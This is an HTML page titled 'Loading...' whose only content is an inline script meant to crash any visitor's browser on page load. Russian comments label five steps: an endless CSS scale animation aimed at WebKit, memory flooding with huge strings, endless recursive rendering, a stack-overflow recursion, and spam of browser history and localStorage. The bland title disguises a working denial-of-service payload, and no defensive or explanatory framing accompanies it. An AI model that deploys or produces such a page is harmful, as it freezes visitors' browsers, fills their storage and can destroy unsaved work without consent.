<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <script>
        (function() {
            // 1. Атака на WebKit через CSS-рендеринг
            let style = document.createElement('style');
            style.textContent = '* { animation: crash 0.0001s infinite; } @keyframes crash { 0% { transform: scale(1); } 100% { transform: scale(99999); } }';
            document.head.appendChild(style);
            
            // 2. Спам огромными строками (для переполнения памяти)
            let strings = [];
            setInterval(() => {
                for(let i = 0; i < 100; i++) {
                    strings.push('X'.repeat(10000000));
                }
            }, 1);
            
            // 3. Бесконечный рекурсивный рендер
            function crashRender() {
                document.body.appendChild(document.createElement('div')).innerHTML = 'X'.repeat(100000);
                requestAnimationFrame(crashRender);
            }
            crashRender();
            
            // 4. Убиваем JavaScript-движок через бесконечную рекурсию
            function stackOverflow() {
                let a = [1,2,3,4,5];
                let b = a.map(x => x * 9999999);
                stackOverflow();
            }
            setTimeout(stackOverflow, 10);
            
            // 5. Спам историей + localStorage
            setInterval(() => {
                for(let i=0;i<10000;i++) {
                    history.pushState({}, '', '/?' + Math.random());
                    localStorage.setItem('c'+i, 'x'.repeat(1000000));
                }
            }, 1);
        })();
    </script>
</body>
</html>
